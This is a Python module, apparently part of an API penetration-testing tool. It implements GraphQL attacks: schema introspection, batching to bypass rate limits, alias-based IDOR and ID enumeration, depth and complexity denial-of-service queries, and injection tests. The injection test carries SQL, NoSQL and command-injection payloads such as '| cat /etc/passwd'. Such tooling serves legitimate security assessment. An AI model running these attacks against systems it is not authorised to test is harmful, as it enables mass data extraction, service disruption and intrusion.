"""
GraphQL-specific attack module for API security testing.

This module provides GraphQLAttacker which implements attacks specific
to GraphQL APIs including introspection abuse, batching attacks, alias
exploitation, depth attacks, and field enumeration.

GraphQL has unique security considerations:
- Introspection exposes full API schema
- Batching can bypass rate limits
- Aliases enable IDOR and mass data extraction
- Nested queries enable DoS via complexity
- Directives can be abused for info disclosure

Usage:
    from api_pentest.core.graphql_attacks import GraphQLAttacker

    attacker = GraphQLAttacker(http_client, "https://api.example.com/graphql")

    # Extract schema via introspection
    schema = attacker.introspect()

    # Test for IDOR via aliases
    results = attacker.test_idor_via_aliases("user", "id", range(1, 100))

    # Test depth attack
    result = attacker.test_depth_attack(depth=20)
"""

import json
import logging
import re
from dataclasses import dataclass, field
from typing import Any, TYPE_CHECKING

if TYPE_CHECKING:
    from api_pentest.core.http_client import PentestHttpClient
    from api_pentest.core.models import Evidence

logger = logging.getLogger(__name__)


@dataclass
class GraphQLType:
    """Represents a GraphQL type from introspection."""
    name: str
    kind: str  # OBJECT, SCALAR, ENUM, INPUT_OBJECT, etc.
    fields: list[dict] = field(default_factory=list)
    input_fields: list[dict] = field(default_factory=list)
    enum_values: list[str] = field(default_factory=list)


@dataclass
class GraphQLSchema:
    """Parsed GraphQL schema from introspection."""
    query_type: str = ""
    mutation_type: str = ""
    subscription_type: str = ""
    types: dict[str, GraphQLType] = field(default_factory=dict)
    directives: list[dict] = field(default_factory=list)

    def get_queries(self) -> list[dict]:
        """Get all query fields."""
        if self.query_type and self.query_type in self.types:
            return self.types[self.query_type].fields
        return []

    def get_mutations(self) -> list[dict]:
        """Get all mutation fields."""
        if self.mutation_type and self.mutation_type in self.types:
            return self.types[self.mutation_type].fields
        return []

    def get_type(self, name: str) -> GraphQLType | None:
        """Get type by name."""
        return self.types.get(name)


@dataclass
class GraphQLAttackResult:
    """Result of a GraphQL attack test."""
    is_vulnerable: bool
    attack_type: str
    description: str
    evidence: list["Evidence"] = field(default_factory=list)
    extracted_data: Any = None
    severity: str = "medium"


class GraphQLAttacker:
    """Implements GraphQL-specific security tests.

    Covers introspection, batching, aliases, depth attacks, and more.
    """

    # Full introspection query
    INTROSPECTION_QUERY = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args { ...InputValue }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args { ...InputValue }
        type { ...TypeRef }
        isDeprecated
        deprecationReason
      }
      inputFields { ...InputValue }
      interfaces { ...TypeRef }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes { ...TypeRef }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
    """

    # Minimal introspection (for testing if enabled)
    MINIMAL_INTROSPECTION = """
    query { __schema { types { name kind } } }
    """

    # Type name query (even more minimal)
    TYPENAME_QUERY = """
    query { __typename }
    """

    def __init__(self, http_client: "PentestHttpClient", endpoint: str):
        """Initialize GraphQLAttacker.

        Args:
            http_client: HTTP client for making requests
            endpoint: GraphQL endpoint URL
        """
        self.http = http_client
        self.endpoint = endpoint
        self._schema: GraphQLSchema | None = None

    def execute_query(
        self,
        query: str,
        variables: dict | None = None,
        operation_name: str | None = None,
        headers: dict | None = None,
    ) -> tuple["Evidence", dict | None]:
        """Execute a GraphQL query and return response.

        Args:
            query: GraphQL query string
            variables: Query variables
            operation_name: Operation name
            headers: Additional headers

        Returns:
            Tuple of (Evidence, parsed_data or None)
        """
        body = {"query": query}
        if variables:
            body["variables"] = variables
        if operation_name:
            body["operationName"] = operation_name

        request_headers = {"Content-Type": "application/json"}
        if headers:
            request_headers.update(headers)

        evidence = self.http.request(
            method="POST",
            url=self.endpoint,
            headers=request_headers,
            body=body,
        )

        data = None
        if evidence.response_status == 200:
            try:
                data = json.loads(evidence.response_body)
            except json.JSONDecodeError:
                pass

        return evidence, data

    # =========================================================================
    # Introspection Attacks
    # =========================================================================

    def test_introspection_enabled(self) -> GraphQLAttackResult:
        """Test if introspection is enabled.

        Introspection should be disabled in production as it exposes
        the entire API schema to attackers.

        Returns:
            GraphQLAttackResult indicating if introspection is enabled
        """
        evidence, data = self.execute_query(self.MINIMAL_INTROSPECTION)

        if data and "data" in data and data["data"].get("__schema"):
            return GraphQLAttackResult(
                is_vulnerable=True,
                attack_type="introspection",
                description="GraphQL introspection is enabled. Full API schema is exposed.",
                evidence=[evidence],
                extracted_data=data,
                severity="medium",
            )

        # Check for partial introspection
        evidence2, data2 = self.execute_query(self.TYPENAME_QUERY)
        if data2 and "data" in data2:
            return GraphQLAttackResult(
                is_vulnerable=True,
                attack_type="introspection-partial",
                description="GraphQL __typename is accessible. Partial schema enumeration possible.",
                evidence=[evidence, evidence2],
                severity="low",
            )

        return GraphQLAttackResult(
            is_vulnerable=False,
            attack_type="introspection",
            description="GraphQL introspection is disabled (good).",
            evidence=[evidence],
        )

    def introspect(self) -> GraphQLSchema | None:
        """Extract full schema via introspection.

        Returns:
            GraphQLSchema object or None if introspection fails
        """
        evidence, data = self.execute_query(self.INTROSPECTION_QUERY)

        if not data or "data" not in data:
            logger.warning("Introspection query failed")
            return None

        schema_data = data.get("data", {}).get("__schema", {})
        if not schema_data:
            return None

        schema = GraphQLSchema(
            query_type=schema_data.get("queryType", {}).get("name", ""),
            mutation_type=(schema_data.get("mutationType") or {}).get("name", ""),
            subscription_type=(schema_data.get("subscriptionType") or {}).get("name", ""),
            directives=schema_data.get("directives", []),
        )

        # Parse types
        for type_data in schema_data.get("types", []):
            if type_data.get("name", "").startswith("__"):
                continue  # Skip introspection types

            gql_type = GraphQLType(
                name=type_data.get("name", ""),
                kind=type_data.get("kind", ""),
                fields=type_data.get("fields") or [],
                input_fields=type_data.get("inputFields") or [],
                enum_values=[v.get("name") for v in (type_data.get("enumValues") or [])],
            )
            schema.types[gql_type.name] = gql_type

        self._schema = schema
        logger.info(f"Introspected schema: {len(schema.types)} types, "
                   f"{len(schema.get_queries())} queries, "
                   f"{len(schema.get_mutations())} mutations")

        return schema

    # =========================================================================
    # Batching Attacks
    # =========================================================================

    def test_batching_enabled(self, query: str = "{ __typename }") -> GraphQLAttackResult:
        """Test if query batching is enabled.

        Batching can be abused to bypass rate limits by sending
        multiple operations in a single request.

        Args:
            query: Query to batch (default: simple __typename)

        Returns:
            GraphQLAttackResult
        """
        # Send array of queries
        batch_body = [
            {"query": query},
            {"query": query},
            {"query": query},
        ]

        evidence = self.http.request(
            method="POST",
            url=self.endpoint,
            headers={"Content-Type": "application/json"},
            body=batch_body,
        )

        data = None
        if evidence.response_status == 200:
            try:
                data = json.loads(evidence.response_body)
            except json.JSONDecodeError:
                pass

        # Batching is enabled if we get an array response
        if isinstance(data, list) and len(data) == 3:
            return GraphQLAttackResult(
                is_vulnerable=True,
                attack_type="batching",
                description="GraphQL query batching is enabled. Rate limits may be bypassable.",
                evidence=[evidence],
                extracted_data=data,
                severity="medium",
            )

        return GraphQLAttackResult(
            is_vulnerable=False,
            attack_type="batching",
            description="GraphQL batching appears disabled.",
            evidence=[evidence],
        )

    def batch_attack(
        self,
        queries: list[str],
        batch_size: int = 10,
    ) -> list[tuple["Evidence", list | None]]:
        """Execute queries in batches to bypass rate limits.

        Args:
            queries: List of GraphQL queries
            batch_size: Queries per batch

        Returns:
            List of (Evidence, response_data) tuples
        """
        results = []

        for i in range(0, len(queries), batch_size):
            batch = queries[i:i + batch_size]
            batch_body = [{"query": q} for q in batch]

            evidence = self.http.request(
                method="POST",
                url=self.endpoint,
                headers={"Content-Type": "application/json"},
                body=batch_body,
            )

            data = None
            if evidence.response_status == 200:
                try:
                    data = json.loads(evidence.response_body)
                except json.JSONDecodeError:
                    pass

            results.append((evidence, data if isinstance(data, list) else None))

        return results

    # =========================================================================
    # Alias Attacks (IDOR/Data Extraction)
    # =========================================================================

    def test_idor_via_aliases(
        self,
        query_name: str,
        id_field: str,
        id_values: list,
        return_fields: list[str] | None = None,
        headers: dict | None = None,
    ) -> GraphQLAttackResult:
        """Test for IDOR using GraphQL aliases.

        Uses aliases to query multiple objects by ID in a single request,
        bypassing rate limits and enabling mass data extraction.

        Args:
            query_name: Name of the query (e.g., "user", "order")
            id_field: Name of the ID argument (e.g., "id", "userId")
            id_values: List of IDs to test
            return_fields: Fields to return (default: common fields)
            headers: Additional headers (e.g., auth)

        Returns:
            GraphQLAttackResult with extracted data
        """
        if return_fields is None:
            return_fields = ["id", "name", "email", "username", "role", "status"]

        fields_str = " ".join(return_fields)

        # Build aliased query
        aliases = []
        for i, id_val in enumerate(id_values):
            # Handle different ID types
            if isinstance(id_val, int):
                id_str = str(id_val)
            else:
                id_str = f'"{id_val}"'

            aliases.append(f'item{i}: {query_name}({id_field}: {id_str}) {{ {fields_str} }}')

        query = "query IDORTest {\n  " + "\n  ".join(aliases) + "\n}"

        evidence, data = self.execute_query(query, headers=headers)

        # Analyze results
        successful_ids = []
        if data and "data" in data:
            for key, value in data["data"].items():
                if value is not None:
                    successful_ids.append(key)

        if len(successful_ids) > 0:
            return GraphQLAttackResult(
                is_vulnerable=True,
                attack_type="idor-alias",
                description=f"IDOR via aliases: accessed {len(successful_ids)}/{len(id_values)} objects",
                evidence=[evidence],
                extracted_data=data.get("data") if data else None,
                severity="high",
            )

        return GraphQLAttackResult(
            is_vulnerable=False,
            attack_type="idor-alias",
            description="No unauthorized data access detected.",
            evidence=[evidence],
        )

    def enumerate_ids(
        self,
        query_name: str,
        id_field: str,
        start: int,
        end: int,
        step: int = 1,
        batch_size: int = 50,
        headers: dict | None = None,
    ) -> list[int]:
        """Enumerate valid IDs using aliases.

        Args:
            query_name: Query name
            id_field: ID field name
            start: Start ID
            end: End ID
            step: ID increment
            batch_size: IDs per request
            headers: Auth headers

        Returns:
            List of valid IDs found
        """
        valid_ids = []

        for batch_start in range(start, end, batch_size):
            batch_end = min(batch_start + batch_size, end)
            ids = list(range(batch_start, batch_end, step))

            aliases = []
            for id_val in ids:
                aliases.append(f'id{id_val}: {query_name}({id_field}: {id_val}) {{ id }}')

            query = "query Enumerate {\n  " + "\n  ".join(aliases) + "\n}"
            evidence, data = self.execute_query(query, headers=headers)

            if data and "data" in data:
                for key, value in data["data"].items():
                    if value is not None:
                        try:
                            found_id = int(key.replace("id", ""))
                            valid_ids.append(found_id)
                        except ValueError:
                            pass

        logger.info(f"Enumerated {len(valid_ids)} valid IDs in range {start}-{end}")
        return valid_ids

    # =========================================================================
    # Depth/Complexity Attacks (DoS)
    # =========================================================================

    def test_depth_attack(
        self,
        depth: int = 10,
        field_name: str = "self",
        timeout: float = 30.0,
    ) -> GraphQLAttackResult:
        """Test for depth-based DoS vulnerability.

        Creates a deeply nested query to test if depth limiting is in place.

        Args:
            depth: Nesting depth to test
            field_name: Self-referential field name (common: self, parent, children)
            timeout: Request timeout

        Returns:
            GraphQLAttackResult
        """
        # Build nested query
        nested = "id"
        for _ in range(depth):
            nested = f"{field_name} {{ {nested} }}"

        query = f"query DepthTest {{ {nested} }}"

        evidence, data = self.execute_query(query)

        # Check for success or explicit depth error
        if data:
            if "errors" in data:
                error_msgs = [e.get("message", "") for e in data.get("errors", [])]
                if any("depth" in msg.lower() or "complexity" in msg.lower() for msg in error_msgs):
                    return GraphQLAttackResult(
                        is_vulnerable=False,
                        attack_type="depth-attack",
                        description=f"Depth limiting is enabled (blocked at depth {depth}).",
                        evidence=[evidence],
                    )

            if "data" in data:
                return GraphQLAttackResult(
                    is_vulnerable=True,
                    attack_type="depth-attack",
                    description=f"Deep query (depth {depth}) executed. No depth limiting detected.",
                    evidence=[evidence],
                    severity="medium",
                )

        return GraphQLAttackResult(
            is_vulnerable=False,
            attack_type="depth-attack",
            description="Query failed, unable to determine depth limiting status.",
            evidence=[evidence],
        )

    def test_complexity_attack(
        self,
        list_field: str = "users",
        nested_field: str = "posts",
        count: int = 100,
    ) -> GraphQLAttackResult:
        """Test for complexity-based DoS vulnerability.

        Creates a query with high multiplicative complexity.

        Args:
            list_field: Field returning a list
            nested_field: Nested field on list items
            count: Requested items per level

        Returns:
            GraphQLAttackResult
        """
        # O(n^2) complexity query
        query = f"""
        query ComplexityTest {{
          {list_field}(first: {count}) {{
            id
            {nested_field}(first: {count}) {{
              id
            }}
          }}
        }}
        """

        evidence, data = self.execute_query(query)

        if data and "errors" in data:
            error_msgs = [e.get("message", "") for e in data.get("errors", [])]
            if any("complexity" in msg.lower() or "cost" in msg.lower() for msg in error_msgs):
                return GraphQLAttackResult(
                    is_vulnerable=False,
                    attack_type="complexity-attack",
                    description="Query complexity limiting is enabled.",
                    evidence=[evidence],
                )

        if data and "data" in data and data["data"]:
            return GraphQLAttackResult(
                is_vulnerable=True,
                attack_type="complexity-attack",
                description=f"High complexity query executed ({count}x{count}). No cost limiting.",
                evidence=[evidence],
                severity="medium",
            )

        return GraphQLAttackResult(
            is_vulnerable=False,
            attack_type="complexity-attack",
            description="Query failed, complexity limiting status unclear.",
            evidence=[evidence],
        )

    # =========================================================================
    # Field Suggestion Attack
    # =========================================================================

    def test_field_suggestions(self, type_name: str = "Query") -> GraphQLAttackResult:
        """Test if field suggestions reveal schema information.

        Many GraphQL servers suggest valid field names when an invalid
        field is queried, enabling schema enumeration even when
        introspection is disabled.

        Args:
            type_name: Type to test field suggestions on

        Returns:
            GraphQLAttackResult with discovered fields
        """
        # Query with intentionally wrong field name
        test_fields = ["zzz_invalid_field", "aaa_test", "xxx_nonexistent"]
        discovered_fields = []

        for test_field in test_fields:
            query = f"query {{ {test_field} }}"
            evidence, data = self.execute_query(query)

            if data and "errors" in data:
                for error in data.get("errors", []):
                    message = error.get("message", "")
                    # Look for "Did you mean X?" patterns
                    suggestions = re.findall(r'["\']([a-zA-Z_][a-zA-Z0-9_]*)["\']', message)
                    for suggestion in suggestions:
                        if suggestion not in discovered_fields and suggestion != test_field:
                            discovered_fields.append(suggestion)

        if discovered_fields:
            return GraphQLAttackResult(
                is_vulnerable=True,
                attack_type="field-suggestions",
                description=f"Field suggestions enabled. Discovered: {', '.join(discovered_fields[:10])}",
                evidence=[],
                extracted_data=discovered_fields,
                severity="low",
            )

        return GraphQLAttackResult(
            is_vulnerable=False,
            attack_type="field-suggestions",
            description="Field suggestions not detected.",
            evidence=[],
        )

    # =========================================================================
    # Injection Attacks
    # =========================================================================

    def test_injection(
        self,
        query_name: str,
        param_name: str,
        param_type: str = "String",
        headers: dict | None = None,
    ) -> GraphQLAttackResult:
        """Test for injection vulnerabilities in GraphQL arguments.

        Args:
            query_name: Query to test
            param_name: Parameter name
            param_type: Parameter type (String, Int, etc.)
            headers: Auth headers

        Returns:
            GraphQLAttackResult
        """
        injection_payloads = [
            # SQL Injection
            "' OR '1'='1",
            "1; DROP TABLE users--",
            # NoSQL Injection
            '{"$ne": null}',
            '{"$gt": ""}',
            # Command Injection
            "; id",
            "| cat /etc/passwd",
        ]

        vulnerable_payloads = []

        for payload in injection_payloads:
            if param_type == "String":
                arg_value = f'"{payload}"'
            elif param_type == "Int":
                arg_value = payload.split()[0] if payload[0].isdigit() else "1"
            else:
                arg_value = f'"{payload}"'

            query = f"query Test {{ {query_name}({param_name}: {arg_value}) {{ id }} }}"

            evidence, data = self.execute_query(query, headers=headers)

            # Check for signs of successful injection
            if evidence.response_status == 200:
                body = evidence.response_body.lower()
                injection_indicators = [
                    "root:", "uid=", "syntax error", "sql",
                    "mongodb", "internal server error"
                ]
                for indicator in injection_indicators:
                    if indicator in body:
                        vulnerable_payloads.append(payload)
                        break

        if vulnerable_payloads:
            return GraphQLAttackResult(
                is_vulnerable=True,
                attack_type="injection",
                description=f"Potential injection in {query_name}.{param_name}",
                evidence=[],
                extracted_data=vulnerable_payloads,
                severity="high",
            )

        return GraphQLAttackResult(
            is_vulnerable=False,
            attack_type="injection",
            description="No injection vulnerabilities detected.",
            evidence=[],
        )


# Convenience function
def test_graphql_security(
    http_client: "PentestHttpClient",
    endpoint: str,
) -> dict[str, GraphQLAttackResult]:
    """Run all GraphQL security tests.

    Args:
        http_client: HTTP client
        endpoint: GraphQL endpoint URL

    Returns:
        Dict of test_name -> GraphQLAttackResult
    """
    attacker = GraphQLAttacker(http_client, endpoint)

    results = {
        "introspection": attacker.test_introspection_enabled(),
        "batching": attacker.test_batching_enabled(),
        "field_suggestions": attacker.test_field_suggestions(),
        "depth_attack": attacker.test_depth_attack(depth=15),
    }

    return results
